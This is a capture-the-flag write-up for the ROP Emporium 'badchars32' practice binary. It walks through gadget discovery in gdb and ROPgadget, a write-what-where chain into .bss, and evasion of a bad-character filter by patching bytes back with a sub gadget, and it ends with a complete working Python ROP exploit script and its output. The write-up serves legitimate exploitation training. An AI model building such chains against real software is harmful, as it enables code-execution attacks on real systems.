# badchars32 writeup
This challenge is similar to write4, but with an added wrinkle. As in write4, we need to find gadgets that give us a write-what-where (arbitrary write primitive), but unlike write4, this challenge will modify the characters `['x', 'g', 'a', '.']` if we pass them as part of our payload. This is very conviently designed, of course, to prevent us from easily writing "flag.txt" into memory.

## The goal
As with write4, our target binary has a PLT stub entry for the `print_file` function which is imported from our companion shared object file (`libbadchars32.so` in this case).

```
# gdb badchars32
GNU gdb (Debian 16.2-8) 16.2
...
(gdb) info functions

Non-debugging symbols:
0x0804837c  _init
0x080483b0  pwnme@plt
0x080483c0  __libc_start_main@plt
0x080483d0  print_file@plt
```

Our goal will be to call the `print_file` function (address `0x080483d0`) with the argument `flag.txt`. To do this, we will need to write the string `flag.txt` into memory, which requires:
  1. An arbitrary write primitive
  2. A way to evade the aforementioned "badchars" filtering of 'x', 'g', 'a', and '.'

## Arbitrary write primitive
At the aptly-named `usefulGadgets` symbol address, we find a familiar gadget:

```
# gdb badchars32
GNU gdb (Debian 16.2-8) 16.2
...
(gdb) info functions

Non-debugging symbols:
0x08048543  usefulGadgets

(gdb) disas usefulGadgets
...
   0x0804854f <+12>:    mov    DWORD PTR [edi],esi
   0x08048551 <+14>:    ret
```

This gadget, combined with the ability to control edi and esi, gives us the ability to write the four bytes in esi to the address stored in edi. To control edi and esi, we will need another gadget. I used the pwntools `ROPgadget` utility for this:

```
ROPgadget --binary badchars32 | egrep "pop esi|pop edi"
...
0x080485b9 : pop esi ; pop edi ; pop ebp ; ret

```
The above gadget will work well; we just need to put an additional 4-byte dummy value in for ebp. I used `0xdeadc0de` for this, and in every place throughout my code where I needed a dummy value (shoutout to Stephen Sims!).

Now, chaining our two gadgets together to create the arbitrary write primitive (python):
```python
def write_what_where(data, addr):
    if len(data) != 4:
        raise Exception("data length must be 4")

    pop_esi_pop_edi_pop_ebp_ret = b'\xb9\x85\x04\x08'
    mov_dword_ptr_edi_esi       = b'\x4f\x85\x04\x08'
    deadcode = b'\xde\xc0\xad\xde'

    # jump to pop/pop/pop/ret gadget; set up registers for mov call; ret to mov call
    payload = pop_esi_pop_edi_pop_ebp_ret + \
            data + \
            addr + \
            deadcode + \
            mov_dword_ptr_edi_esi
```

The function would then be called like this:
```python
# Choosing 0x0804a050 as my address; more on that in a moment
payload += write_what_where(b'flag', b'\x50\xa0\x04\x08')

```

To write `flag.txt` into memory, we will need to leverage this primitive at least two times. Once to write the first four bytes (`b'flag'`) and once for the second four (`b'.txt'`). I am in the habit of also calling it a third time, to make sure my string is null-terminated (`b'\x00'`) and then I usually write another 3 bytes just for fun, making my third call something like `b'\x00lol'`. Of note, the third call is probably not necessary in my case, as I chose to write data to the `.bss` segment, where almost the whole region of memory is full of null bytes anyways, but I have the third one in there just to be safe.

## Where to write the payload?
Fundamentally, we need a region of memory which is mapped `rw`, which will not break other parts of the code if we overwrite it. A popular place that meets these requirements is the `.bss` section. In gdb, we can find and confirm this is a valid place to write our data. I use a gdb script to kick off the process, and then look at the mappings after the program is running.
```
#### script.gdb ####

# Breakpoint on shared library load
catch load

# Run until the .so is loaded
# Set a breakpoint on the ret instruction from the pwnme function
run < <(python challenge.py)
break *pwnme+273
####################

gdb ./badchars32 -x script.gdb

(gdb) info proc mappings
...
0x0804a000 0x0804b000 0x1000     0x1000     rw-p  /root/rop-emporium/badchars/badchars32

# Confirming that the .bss section lives in here:
(gdb) maintenance info sections
[22]     0x804a000->0x804a018 at 0x00001000: .got.plt ALLOC LOAD DATA HAS_CONTENTS
[23]     0x804a018->0x804a020 at 0x00001018: .data ALLOC LOAD DATA HAS_CONTENTS
[24]     0x804a020->0x804a024 at 0x00001020: .bss ALLOC
```
It's important to note that although the `.bss` section only shows a range of 4 bytes here, the kernel maps the entire 4096-byte memory page (from `0x0804a000` to `0x0804b000`). This means we have plenty of space to write our `b'flag.txt'` string here. Also, we definitely don't want to overwrite stuff in the `.got.plt` section to avoid breaking things. I chose the address `0x0804a050` which is just a short way into the unused space in the `.bss` section.

## Running into the badchars filtering
So far, everything we have done is basically the same as the write4 challenge. Here is where it gets interesting.

Here is an excerpt of the ghidra decompliation of the `libbadchars32.so`, in the pwnme function. We can see the badchars filtering at play here. I renamed some of the variables to make it easier to read.
```C
  nBytesRead = read(0,userbuf,0x200);
  for (i = 0; i < nBytesRead; i = i + 1) {
    for (j = 0; j < 4; j = j + 1) {
      if (userbuf[i] == "xga.badchars by ROP Emporium"[j]) {
        userbuf[i] = -0x15;
      }
    }
  }
```
Basically, as the `read()` buffer is processed, it will be checked against the badchars array, and if a matching badchar is found, it will be overwritten with `-0x15`.

To circumvent this, I chose to modify the data before putting it in my payload. By the time we have hijacked control flow (when the pwnme function returns), the filtering is already done, so we can use another sequence of ROP gadgets to "patch" the bytes in memory back to what we want!

So, our new steps for the exploit will be:
* Find an arbitrary write primitive (check!)
* As we are writing our `b'flag.txt'` string into memory, if the byte we are about to write matches a "badchar", modify it by adding 1. Also, save its address for later, so the patching of the bytes is easier to handle.
    * The payload that we actually write into memory will be `b'flbh/tyt'`
* Find another sequence of ROP gadgets which will patch our modified bytes back, to make the final string `b'flag.txt'` once again.

First, we rewrite our write-what-where function to perform this sanitization for us:
```python
import struct
transformed = []

payload_locations = [
    b'\x50\xa0\x04\x08',
    b'\x54\xa0\x04\x08',
    b'\x58\xa0\x04\x08'
]

def write_what_where_sanitize(data, addr):
    if len(data) != 4:
        raise Exception("data length must be 4")

    ## Modify data prior to writing it to the stack
    print(f"Original data: {data}")
    data_sanitized = sanitize(data, addr)

    print(f"Writing sanitized data: {data_sanitized}")

    pop_esi_pop_edi_pop_ebp_ret = b'\xb9\x85\x04\x08'
    mov_dword_ptr_edi_esi       = b'\x4f\x85\x04\x08'
    deadcode = b'\xde\xc0\xad\xde'

    # jump to pop/pop/pop/ret gadget; set up registers for mov call; ret to mov call
    payload = pop_esi_pop_edi_pop_ebp_ret + \
            data_sanitized + \
            addr + \
            deadcode + \
            mov_dword_ptr_edi_esi

    return payload

def sanitize(data, start_addr):
    """
        Iterate over data at start_addr,
        Transform characters as needed (by adding one)
        And keep track of the address of each of the
        transformed characters.
    """
    badchars    = ['x', 'g', 'a', '.']
    new_bytes   = b''

    for idx, c in enumerate(data):
        if chr(c) in badchars:

            # Add one to the byte to evade the filtering
            # Store the address where the modified data is
            modified_addr = struct.pack("<I", (struct.unpack("<I", start_addr)[0] + idx))
            print(f"Modified data at {modified_addr.hex()})")
            transformed.append(modified_addr)

            new_bytes += bytes([(c+1)])
        else:
            new_bytes += bytes([c])

    return new_bytes

flag_str   = b'flag'
dot_txt    = b'.txt'
null_bytes = b'\x00lol' # to terminate the string

## write data to memory in sanitized form
payload += write_what_where_sanitize(flag_str, payload_locations[0])
payload += write_what_where_sanitize(dot_txt, payload_locations[1])
payload += write_what_where_sanitize(null_bytes, payload_locations[2])
```
Now, we just need to add our byte patching gadgets onto the end of our chain.

## The byte-patcher gadgets
There is another sequence of gadgets in the usefulGadgets section which we can use here:

```
# gdb badchars32 

(gdb) disas usefulGadgets
...
   0x0804854b <+8>:     sub    BYTE PTR [ebp+0x0],bl
   0x0804854e <+11>:    ret
```

It's not clear to me why gdb disassembled that gadget as `[ebp+0x0]`, rather than just `[ebp]`, but the point remains the same. If we can control ebx (and the lowest byte of ebx, bl) and ebp, we can subtract bl from the byte at the address of ebp! This is exactly what we need to do to modify our bytes back. We can use a similar `pop/pop/pop/pop/ret` gadget to control ebx and ebp:

```
# ROPgadget --binary badchars32 | egrep "pop ebp|pop ebx"
0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
```

Putting it together in a python function, which takes an address to patch (hence why we saved those addresses earlier when we wrote the `sanitize()` function):
```python

def patch_byte(addr):
    pop_ebx_pop_esi_pop_edi_pop_ebp_ret = b'\xb8\x85\x04\x08'
    sub_byte_ptr_ebp_bl_ret             = b'\x4b\x85\x04\x08'

    print(f"Transforming data at {addr.hex()}")

    """ jump to pop/pop/pop/pop/ret gadget;
        set up registers for sub call;
        ret to sub call
    """

    # sub gadget only cares about bl (lowest byte of ebx)
    # so we can use any 3 bytes after \x01.
    # esi/edi don't matter.
    # address goes into ebp for sub gadget.
    payload = pop_ebx_pop_esi_pop_edi_pop_ebp_ret + \
            b'\x01AAA' + \
            deadcode + \
            deadcode + \
            addr + \
            sub_byte_ptr_ebp_bl_ret

    return payload
```

Since we kept track of the addresses that need to be patched earlier, calling the `patch_byte` function is as simple as:
```python
for addr in transformed:
    payload += patch_byte(addr)
```

The only thing that's left to do is return to `print_file`, and pass the address of our sweet, sweet, `b'flag.txt'` string as an argument.

## Complete script
Putting it all together, here is the complete exploit script:

```python
#!/usr/bin/python
import sys
import struct

payload_locations = [
    b'\x50\xa0\x04\x08',
    b'\x54\xa0\x04\x08',
    b'\x58\xa0\x04\x08'
]

transformed = []
deadcode   = b'\xde\xc0\xad\xde'

def write_what_where_sanitize(data, addr):
    """
        4-byte write primitive using the following gadgets:
        0x0804854f  mov DWORD PTR [edi],esi; ret
        0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
    """

    """
        I can also control ebx with this gadget...
        0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret

        And I can modify data at the address of ebp.
           0x08048543  add    BYTE PTR [ebp+0x0],bl ; ret
           0x08048547  xor    BYTE PTR [ebp+0x0],bl ; ret
           0x0804854b  sub    BYTE PTR [ebp+0x0],bl ; ret
    """

    if len(data) != 4:
        raise Exception("data length must be 4")

    ## Modify data prior to writing it to the stack
    print(f"Original data: {data}")
    data_sanitized = sanitize(data, addr)

    print(f"Writing sanitized data: {data_sanitized}")

    pop_esi_pop_edi_pop_ebp_ret = b'\xb9\x85\x04\x08'
    mov_dword_ptr_edi_esi       = b'\x4f\x85\x04\x08'
    deadcode = b'\xde\xc0\xad\xde'

    # jump to pop/pop/pop/ret gadget; set up registers for mov call; ret to mov call
    payload = pop_esi_pop_edi_pop_ebp_ret + \
            data_sanitized + \
            addr + \
            deadcode + \
            mov_dword_ptr_edi_esi

    return payload

def sanitize(data, start_addr):
    """
        Iterate over data at start_addr,
        Transform characters as needed (by adding one)
        And keep track of the address of each of the
        transformed characters.
    """
    badchars    = ['x', 'g', 'a', '.']
    new_bytes   = b''

    for idx, c in enumerate(data):
        if chr(c) in badchars:

            # Add one to the byte to evade the filtering
            # Store the address where the modified data is
            modified_addr = struct.pack("<I", (struct.unpack("<I", start_addr)[0] + idx))
            print(f"Modified data at {modified_addr.hex()})")
            transformed.append(modified_addr)

            new_bytes += bytes([(c+1)])
        else:
            new_bytes += bytes([c])

    return new_bytes

def patch_byte(addr):
    """
        Patch one byte by subtracting one from a byte at a given address.

        gadget to subtract one from a byte:
        0x0804854b : sub byte ptr [ebp], bl ; ret

        can control ebp and bl with this gadget:
        0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    """
    pop_ebx_pop_esi_pop_edi_pop_ebp_ret = b'\xb8\x85\x04\x08'
    sub_byte_ptr_ebp_bl_ret             = b'\x4b\x85\x04\x08'

    print(f"Transforming data at {addr.hex()}")

    """ jump to pop/pop/pop/pop/ret gadget;
        set up registers for sub call;
        ret to sub call
    """

    # sub gadget only cares about bl (lowest byte of ebx)
    # so we can use any 3 bytes after \x01.
    # esi/edi don't matter.
    # address goes into ebp for sub gadget.
    payload = pop_ebx_pop_esi_pop_edi_pop_ebp_ret + \
            b'\x01AAA' + \
            deadcode + \
            deadcode + \
            addr + \
            sub_byte_ptr_ebp_bl_ret

    return payload

flag_str   = b'flag'
dot_txt    = b'.txt'
null_bytes = b'\x00lol' # to terminate the string

print_file = b'\xd0\x83\x04\x08'
deadcode   = b'\xde\xc0\xad\xde'

payload = b'A'*40
payload += b'B'*4                # ebp

## write data to memory in sanitized form
payload += write_what_where_sanitize(flag_str, payload_locations[0])
payload += write_what_where_sanitize(dot_txt, payload_locations[1])
payload += write_what_where_sanitize(null_bytes, payload_locations[2])

# rop to modify bytes as necessary
for addr in transformed:
    payload += patch_byte(addr)

payload += print_file            # function to exec
payload += deadcode              # return for print_file
payload += payload_locations[0]  # argument for print_file

sys.stdout.buffer.write(payload)
```

Running it:
```
python challenge.py | ./badchars32 
badchars by ROP Emporium
x86

badchars are: 'x', 'g', 'a', '.'
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```
